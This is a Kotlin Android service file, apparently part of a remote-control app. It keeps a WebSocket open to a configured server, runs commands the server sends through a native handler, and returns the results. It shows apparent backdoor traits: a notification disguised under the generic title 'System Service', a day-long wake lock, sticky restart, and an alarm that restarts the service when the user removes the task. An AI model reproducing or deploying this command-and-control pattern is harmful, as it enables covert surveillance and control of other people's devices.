package com.template.app

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class ConnectionService : Service() {

    companion object {
        private const val TAG = "ConnectionService"
        private const val CHANNEL_ID = "connection_service_channel"
        private const val NOTIF_ID = 2001
        private const val PING_INTERVAL_MS = 15000L  // 15 detik

        fun start(context: Context) {
            try {
                val intent = Intent(context, ConnectionService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "start error", e)
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, ConnectionService::class.java))
            } catch (e: Exception) {}
        }
    }

    private var webSocket: WebSocket? = null
    private var wsUrl: String = ""
    private var deviceId: String = ""

    // ⬇️ FIX FINAL: TANPA pingInterval. Pakai app-level ping.
    private val client = OkHttpClient.Builder()
        // NO pingInterval — biar app-level ping yang handle
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)        // 0 = disabled
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var reconnectAttempts = 0
    private val maxReconnectDelay = 60_000L
    private var wakeLock: PowerManager.WakeLock? = null
    private var isRunning = false
    private val mainHandler = Handler(Looper.getMainLooper())

    // ==========================================
    // ===== APP-LEVEL PING =====
    // ==========================================
    private val pingRunnable = object : Runnable {
        override fun run() {
            try {
                if (webSocket != null) {
                    val ping = JSONObject().apply {
                        put("type", "ping")
                        put("ts", System.currentTimeMillis())
                    }
                    webSocket?.send(ping.toString())
                    Log.d(TAG, "💓 App ping sent")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Ping error", e)
            }
            // Jadwalkan ping berikutnya
            if (isRunning) {
                mainHandler.postDelayed(this, PING_INTERVAL_MS)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🔥 Service created")
        createNotificationChannel()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "▶️ Service started")

        try {
            val notif = buildNotification("Menghubungkan...")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceCompat.startForeground(
                    this, NOTIF_ID, notif,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else {
                startForeground(NOTIF_ID, notif)
            }
        } catch (e: Exception) {
            Log.e(TAG, "startForeground error", e)
        }

        if (!isRunning) {
            isRunning = true
            connectWebSocket()
        }

        return START_STICKY
    }

    // ==========================================
    // ===== WEBSOCKET =====
    // ==========================================
    private fun connectWebSocket() {
        val prefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
        val serverUrl = prefs.getString("flutter.serverUrl", "") ?: ""
        deviceId = prefs.getString("flutter.deviceId", "") ?: ""
        val accessKey = prefs.getString("flutter.accessKey", "") ?: ""

        if (serverUrl.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "❌ Config missing: serverUrl=$serverUrl, deviceId=$deviceId")
            scheduleReconnect()
            return
        }

        wsUrl = serverUrl
            .replace("https://", "wss://")
            .replace("http://", "ws://") +
            "/ws?deviceId=$deviceId&accessKey=$accessKey"

        Log.d(TAG, "🔌 Connecting to: $wsUrl")

        val request = Request.Builder().url(wsUrl).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "✅ WS Connected")
                reconnectAttempts = 0
                updateNotification("Terhubung")

                // Kirim hello
                val hello = JSONObject().apply {
                    put("type", "hello")
                    put("deviceId", deviceId)
                }
                webSocket.send(hello.toString())
                Log.d(TAG, "👋 Hello sent")

                // Start app-level ping
                mainHandler.removeCallbacks(pingRunnable)
                mainHandler.postDelayed(pingRunnable, PING_INTERVAL_MS)
                Log.d(TAG, "💓 App ping scheduled (interval=${PING_INTERVAL_MS}ms)")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "📩 WS Message: ${text.take(100)}")
                try {
                    val json = JSONObject(text)
                    val type = json.optString("type", "")
                    when (type) {
                        "welcome" -> Log.d(TAG, "👋 Welcome received")
                        "command" -> handleCommand(webSocket, json)
                        "pong" -> Log.d(TAG, "💓 Pong from server")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Parse error", e)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "❌ WS Failure")
                Log.e(TAG, "   class:    ${t.javaClass.simpleName}")
                Log.e(TAG, "   message:  ${t.message}")
                Log.e(TAG, "   response: ${response?.code} ${response?.message}")
                t.printStackTrace()

                updateNotification("Reconnecting...")
                mainHandler.removeCallbacks(pingRunnable)
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "🔌 WS Closed: code=$code, reason=$reason")
                mainHandler.removeCallbacks(pingRunnable)
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!isRunning) return
        reconnectAttempts++
        val delay = minOf(2000L * (1 shl (reconnectAttempts - 1).coerceAtMost(5)), maxReconnectDelay)
        Log.d(TAG, "⏰ Reconnect in ${delay}ms (attempt #$reconnectAttempts)")
        mainHandler.postDelayed({
            if (isRunning) connectWebSocket()
        }, delay)
    }

    // ==========================================
    // ===== HANDLE COMMAND (OPSI A - NATIVE) =====
    // ==========================================
    private fun handleCommand(ws: WebSocket, msg: JSONObject) {
        val cmdId = msg.optString("id", "")
        val command = msg.optString("command", "")
        val extra = msg.optString("extra", "")

        Log.d(TAG, "📨 CMD: $command (id=$cmdId)")

        val result = NativeCommandHandler.execute(this, command, extra)

        val response = JSONObject().apply {
            put("type", "response")
            put("commandId", cmdId)
            put("command", command)
            put("result", result)
            put("ts", System.currentTimeMillis())
        }
        ws.send(response.toString())
        Log.d(TAG, "📤 Response sent: $command")
    }

    // ==========================================
    // ===== WAKE LOCK =====
    // ==========================================
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Orgsapp::ConnectionWakeLock"
            )
            wakeLock?.acquire(24 * 60 * 60 * 1000L)
            Log.d(TAG, "🔒 WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error", e)
        }
    }

    // ==========================================
    // ===== NOTIFICATION =====
    // ==========================================
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                CHANNEL_ID, "Connection Service", NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Menjaga koneksi ke server"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
    }

    private fun buildNotification(status: String): Notification {
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
        val pendingIntent = if (launchIntent != null) {
            PendingIntent.getActivity(
                this, 0, launchIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )
        } else null

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun updateNotification(status: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification(status))
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        Log.d(TAG, "💀 Service destroyed")
        isRunning = false
        mainHandler.removeCallbacks(pingRunnable)

        try {
            webSocket?.close(1000, "Service stopped")
            webSocket = null
        } catch (e: Exception) {}

        try {
            wakeLock?.release()
            wakeLock = null
        } catch (e: Exception) {}

        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "⚠️ Task removed — restart")
        val restartIntent = Intent(applicationContext, ConnectionService::class.java)
        val restartPending = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 2000,
            restartPending,
        )
    }
}
